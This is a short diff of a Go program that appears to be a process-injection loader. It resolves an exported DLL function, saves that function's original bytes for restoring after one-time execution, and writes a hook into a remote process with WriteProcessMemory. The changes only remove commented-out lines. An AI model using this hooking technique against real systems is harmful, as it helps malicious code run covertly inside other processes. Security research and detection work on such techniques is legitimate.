@@ -109,9 +109,6 @@ func main() {
 	}
 
 	// Get address of remote function to hook (GetModuleHandle + LoadLibrary under the hood)
-	// ntdll := windows.NewLazySystemDLL("ntdll.dll")
-	// ntOpenFile := ntdll.NewProc("NtOpenFile")
-	// exportAddress := ntOpenFile.Addr()
 	DLL := windows.NewLazySystemDLL(*dll)
 	remote_fct := DLL.NewProc(*function)
 	exportAddress := remote_fct.Addr()
@@ -134,7 +131,6 @@ func main() {
 		log.Fatal(fmt.Sprintf("Error monitoring function :%s\r\n", errReadFunction.Error()))
 	}
 
-	// pretty print original bytes
 	// fmt.Printf("[+] DEBUG - Original bytes: 0x%x\n", originalBytes)
 	
 	// Write function original bytes to loader, so it can restore after one-time execution
@@ -160,7 +156,6 @@ func main() {
 	
 	// fmt.Printf("[+] DEBUG - callOpCode : 0x%x\n", callOpCode)
 
-	// var bytesRead uint32
 	// Hook the remote function
 	_, _, errWriteHook := WriteProcessMemory.Call(
 		uintptr(pHandle), 
